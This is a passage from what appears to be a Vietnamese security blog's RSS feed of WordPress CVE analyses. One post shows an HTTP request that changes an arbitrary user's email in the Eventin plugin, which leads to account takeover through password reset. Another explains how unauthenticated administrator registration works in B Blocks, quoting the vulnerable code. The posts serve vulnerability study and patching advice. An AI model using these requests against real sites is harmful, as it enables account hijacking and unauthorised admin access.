tại:&#xA;&lt;code&gt;http://localhost/wp-admin/admin.php?page=eventin#/speakers/edit/{id}&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-12-cve-2025-4796/ui.png&#34; title=&#34;Edit speaker&#34; data-thumbnail=&#34;/posts/2026-01-12-cve-2025-4796/ui.png&#34; data-sub-html=&#34;&lt;h2&gt;UI&lt;/h2&gt;&lt;p&gt;Edit speaker&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-12-cve-2025-4796/ui.png&#39; alt=&#34;UI&#34; height=&#34;1123&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit speaker&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Bắt request bằng &lt;strong&gt;BurpSuite&lt;/strong&gt; và gửi lại với &lt;strong&gt;ID của user bất kỳ&lt;/strong&gt; cùng &lt;strong&gt;email do attacker kiểm soát&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/eventin/v2/speakers/44 HTTP/1.1&#xA;Host: localhost&#xA;X-WP-Nonce: valid_nonce&#xA;Cookie: contributor_cookie&#xA;&#xA;{&amp;#34;summary&amp;#34;:&amp;#34;&amp;lt;p&amp;gt;asfsfas&amp;lt;/p&amp;gt;&amp;#34;,&amp;#34;social&amp;#34;:[{}],&amp;#34;name&amp;#34;:&amp;#34;abc&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;hacker1@gmail.com&amp;#34;,&amp;#34;category&amp;#34;:[&amp;#34;speaker&amp;#34;],&amp;#34;speaker_group&amp;#34;:[33],&amp;#34;designation&amp;#34;:&amp;#34;rewrew&amp;#34;,&amp;#34;company_name&amp;#34;:&amp;#34;rewrew&amp;#34;,&amp;#34;date&amp;#34;:null}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-12-cve-2025-4796/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-12-cve-2025-4796/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-12-cve-2025-4796/result.png&#39; alt=&#34;Result&#34; height=&#34;916&#34; width=&#34;1498&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sử dụng chức năng &lt;strong&gt;reset password&lt;/strong&gt; với email đã bị thay đổi.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Đăng nhập bằng tài khoản vừa chiếm quyền kiểm soát.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE-2025-4796 trong plugin &lt;strong&gt;Eventin ≤ 4.0.34&lt;/strong&gt; xuất phát từ việc &lt;strong&gt;không kiểm soát đầy đủ quyền chỉnh sửa user&lt;/strong&gt; trong API &lt;code&gt;update_item&lt;/code&gt;. Endpoint này cho phép người dùng có role &lt;strong&gt;Contributor&lt;/strong&gt; thao tác với &lt;strong&gt;ID user tùy ý&lt;/strong&gt; và cập nhật trực tiếp trường &lt;strong&gt;email&lt;/strong&gt;, dẫn đến khả năng &lt;strong&gt;chiếm quyền tài khoản thông qua chức năng reset mật khẩu&lt;/strong&gt;. Việc thiếu ràng buộc giữa đối tượng được chỉnh sửa và quyền thực tế của người gọi API đã tạo điều kiện cho &lt;strong&gt;Privilege Escalation&lt;/strong&gt; và &lt;strong&gt;Account Takeover&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Phiên bản &lt;strong&gt;4.0.35&lt;/strong&gt; đã khắc phục bằng cách bổ sung kiểm tra tồn tại user, kiểm soát quyền &lt;code&gt;edit_user&lt;/code&gt;, giới hạn role hợp lệ và chặn cập nhật các role nhạy cảm, qua đó loại bỏ khả năng sửa email trái phép.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không nên chỉ dựa vào &lt;strong&gt;capability tổng quát&lt;/strong&gt; cho các endpoint nhạy cảm; cần kiểm tra &lt;strong&gt;quyền trên từng đối tượng (object-level authorization)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Mọi tham số nhạy cảm từ request như &lt;strong&gt;user ID, email, role&lt;/strong&gt; phải được &lt;strong&gt;xác thực và ràng buộc chặt chẽ&lt;/strong&gt; trước khi ghi vào database.&lt;/li&gt;&#xA;&lt;li&gt;Việc cho phép cập nhật &lt;strong&gt;email người dùng&lt;/strong&gt; có thể gián tiếp dẫn đến &lt;strong&gt;Account Takeover&lt;/strong&gt; thông qua cơ chế reset mật khẩu.&lt;/li&gt;&#xA;&lt;li&gt;REST API trong WordPress cần kết hợp &lt;strong&gt;permission_callback&lt;/strong&gt;, &lt;strong&gt;current_user_can(&amp;rsquo;edit_user&amp;rsquo;, $target_id)&lt;/strong&gt; và &lt;strong&gt;role validation&lt;/strong&gt; để tránh leo thang đặc quyền.&lt;/li&gt;&#xA;&lt;li&gt;Luôn so sánh &lt;strong&gt;diff giữa phiên bản vá và phiên bản lỗi&lt;/strong&gt; để xác định chính xác nguyên nhân và phạm vi ảnh hưởng của lỗ hổng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-event-solution/vulnerability/wordpress-eventin-plugin-4-0-34-authenticated-contributor-privilege-escalation-via-user-email-change-account-takeover-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Eventin Plugin &amp;lt;= 4.0.34 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-8059 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-11-cve-2025-8059/</link>
      <pubDate>Sun, 11 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-11-cve-2025-8059/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;B Blocks&lt;/strong&gt; cho WordPress tồn tại lỗ hổng &lt;strong&gt;Nâng cao đặc quyền (Privilege Escalation)&lt;/strong&gt; do &lt;strong&gt;thiếu kiểm tra phân quyền (missing authorization)&lt;/strong&gt; và &lt;strong&gt;xác thực dữ liệu đầu vào không đúng cách (improper input validation)&lt;/strong&gt; trong hàm &lt;strong&gt;rgfr_registration()&lt;/strong&gt; ở &lt;strong&gt;tất cả các phiên bản từ trước đến và bao gồm 2.0.6&lt;/strong&gt;. Lỗ hổng này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực (unauthenticated attackers)&lt;/strong&gt; có thể &lt;strong&gt;tạo tài khoản mới&lt;/strong&gt; và &lt;strong&gt;gán quyền quản trị viên (administrator role)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-8059&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-8059&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 2.0.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.0.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/b-blocks/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress B Blocks Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;B Blocks&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.0.6&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.0.7&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một action hook như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_rgfr_registration&amp;#39;, [$this, &amp;#39;rgfr_registration&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là hook dành cho tất cả người dùng (kể cả chưa đăng nhập).&#xA;Khi có request đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=rgfr_registration&lt;/code&gt; thì callback &lt;code&gt;rgfr_registration&lt;/code&gt; được gọi để xử lý việc đăng ký user.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function rgfr_registration(){&#xA;    $userEmailSent = false;&#xA;    $adminEmailSent = false;&#xA;    $errors = [];&#xA;&#xA;    $nonce = sanitize_text_field($_POST[&amp;#39;nonce&amp;#39;]);&#xA;&#xA;    if(!wp_verify_nonce($nonce, &amp;#39;wp_ajax&amp;#39;)){&#xA;        wp_send_json_error(&amp;#39;invalid request&amp;#39;);&#xA;    }&#xA;&#xA;    $data = [&#xA;        &amp;#39;username&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;username&amp;#39;] ?? null),&#xA;        &amp;#39;email&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;email&amp;#39;] ?? null),&#xA;        &amp;#39;password&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;password&amp;#39;] ?? null),&#xA;        &amp;#39;confirmpassword&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;confirmpassword&amp;#39;] ?? null),&#xA;        &amp;#39;firstname&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;firstName&amp;#39;] ?? null),&#xA;        &amp;#39;lastname&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;lastName&amp;#39;] ?? null),&#xA;        &amp;#39;website&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;website&amp;#39;] ?? null),&#xA;        &amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;role&amp;#39;] ?? null),&#xA;    ];&#xA;&#xA;    $fields = $this-&amp;gt;sanitize_array($_POST[&amp;#39;fields&amp;#39;]);&#xA;    $userEmail = $this-&amp;gt;sanitize_array($_POST[&amp;#39;userEmail&amp;#39;]) ?? null;&#xA;    $adminEmail = $this-&amp;gt;sanitize_array($_POST[&amp;#39;adminEmail&amp;#39;]) ?? null;&#xA;&#xA;    ...&#xA;&#xA;    $user_id = wp_create_user( $data[&amp;#39;username&amp;#39;], $data[&amp;#39;password&amp;#39;], $data[&amp;#39;email&amp;#39;] );&#xA;&#xA;    if(isset($user_id-&amp;gt;errors)){&#xA;        wp_send_json_error($user_id-&amp;gt;errors);&#xA;    }&#xA;    &#xA;    // now we create an account&#xA;    if( $user_id ){ // sent mail after create account&#xA;        wp_update_user([&#xA;            &amp;#39;ID&amp;#39; =&amp;gt; $user_id,&#xA;            &amp;#39;first_name&amp;#39; =&amp;gt; $data[&amp;#39;firstName&amp;#39;],&#xA;            &amp;#39;last_name&amp;#39; =&amp;gt; $data[&amp;#39;lastName&amp;#39;],&#xA;            &amp;#39;user_url&amp;#39; =&amp;gt; $data[&amp;#39;website&amp;#39;],&#xA;            &amp;#39;role&amp;#39; =&amp;gt; $data[&amp;#39;role&amp;#39;],&#xA;        ]);&#xA;        ...&#xA;    }else {&#xA;        wp_send_json_error(&amp;#39;something went wrong during registration&amp;#39;);&#xA;    }&#xA;&#xA;    $user = get_user_by(&amp;#39;id&amp;#39;, $user_id);&#xA;&#xA;    wp_send_json_success([&#xA;        &amp;#39;user&amp;#39; =&amp;gt; $user-&amp;gt;data,&#xA;        &amp;#39;user_id&amp;#39; =&amp;gt; $user_id,&#xA;        &amp;#39;adminEmailSent&amp;#39; =&amp;gt; $adminEmailSent,&#xA;        &amp;#39;userEmailSent&amp;#39; =&amp;gt; $userEmailSent,&#xA;        &amp;#39;roles&amp;#39; =&amp;gt; $user-&amp;gt;roles&#xA;    ]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện nhận toàn bộ dữ liệu đăng ký do client gửi lên, rồi tạo user trực tiếp trong WordPress. Tuy nhiên &lt;strong&gt;không có cơ chế kiểm soát phân quyền (authorization)&lt;/strong&gt; và &lt;strong&gt;không có kiểm tra / ràng buộc giá trị role đầu vào (input validation)&lt;/strong&gt;, dẫn đến việc &lt;strong&gt;client có thể tự ý chỉ định role&lt;/strong&gt; khi gửi request. Điều này tạo điều kiện cho &lt;strong&gt;người dùng chưa xác thực (unauthenticated user)&lt;/strong&gt; có thể &lt;strong&gt;tạo tài khoản mới với quyền quản trị (administrator)&lt;/strong&gt;, gây ra &lt;strong&gt;lỗ hổng nâng cao đặc quyền (Privilege Escalation)&lt;/strong&gt; nghiêm trọng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, điều kiện tiên quyết để việc đăng ký user mới xảy ra suôn sẻ là phải vượt qua bước kiểm tra nonce:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = sanitize_text_field($_POST[&amp;#39;nonce&amp;#39;]);&#xA;&#xA;if(!wp_verify_nonce($nonce, &amp;#39;wp_ajax&amp;#39;)){&#xA;    wp_send_json_error(&amp;#39;invalid request&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện kiểm tra nonce với action là &lt;code&gt;wp_ajax&lt;/code&gt;. Khi tìm kiếm với từ khóa &lt;code&gt;wp_ajax&lt;/code&gt;, có thể thấy nonce được tạo ra khi hai block &lt;strong&gt;&lt;code&gt;LoginForm&lt;/code&gt;&lt;/strong&gt; hoặc &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt; được thêm vào post/page.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/nonce.png&#34; title=&#34;Create nonce&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Create nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;337&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, block &lt;strong&gt;&lt;code&gt;LoginForm&lt;/code&gt;&lt;/strong&gt; chỉ xuất hiện trong chế độ &lt;strong&gt;Dev&lt;/strong&gt; nên không có cách nào để người dùng thông thường tạo được nonce thông qua block này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/login.png&#34; title=&#34;LoginForm&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/login.png&#34; data-sub-html=&#34;&lt;h2&gt;Login&lt;/h2&gt;&lt;p&gt;LoginForm&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/login.png&#39; alt=&#34;Login&#34; height=&#34;691&#34; width=&#34;1726&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;LoginForm&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Như vậy, ta chỉ có thể khai thác dựa trên block &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/countdown.png&#34; title=&#34;Countdown&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/countdown.png&#34; data-sub-html=&#34;&lt;h2&gt;Countdown&lt;/h2&gt;&lt;p&gt;Countdown&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/countdown.png&#39; alt=&#34;Countdown&#34; height=&#34;801&#34; width=&#34;1503&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Countdown&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi truy cập vào post/page có chứa block &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt;, trong response HTML sẽ xuất hiện nonce được render ra phía client. Kẻ tấn công chỉ cần mở &lt;strong&gt;View Source&lt;/strong&gt; hoặc &lt;strong&gt;DevTools → Network → Response&lt;/strong&gt; để trích xuất giá trị nonce này.&lt;/p&gt;&#xA;&lt;p&gt;Sau khi có nonce hợp lệ, attacker có thể gửi một request thủ công tới endpoint AJAX của WordPress, kèm theo nonce và các tham số đăng ký, đặc biệt là trường &lt;strong&gt;&lt;code&gt;role=administrator&lt;/code&gt;&lt;/strong&gt;. Do phía server &lt;strong&gt;không kiểm tra phân quyền&lt;/strong&gt; và &lt;strong&gt;tin tưởng dữ liệu đầu vào&lt;/strong&gt;, request sẽ được chấp nhận và tài khoản mới sẽ được tạo với &lt;strong&gt;quyền quản trị viên&lt;/strong&gt;, hoàn tất quá trình khai thác lỗ hổng.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;&lt;code&gt;v2.0.7&lt;/code&gt;&lt;/strong&gt; đã &lt;strong&gt;xóa bỏ file &lt;code&gt;RegisterForm.php&lt;/code&gt;&lt;/strong&gt;, đồng thời loại bỏ hoàn toàn action hook &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_rgfr_registration&lt;/code&gt;&lt;/strong&gt;, khiến endpoint đăng ký không còn được public cho người dùng chưa đăng nhập. 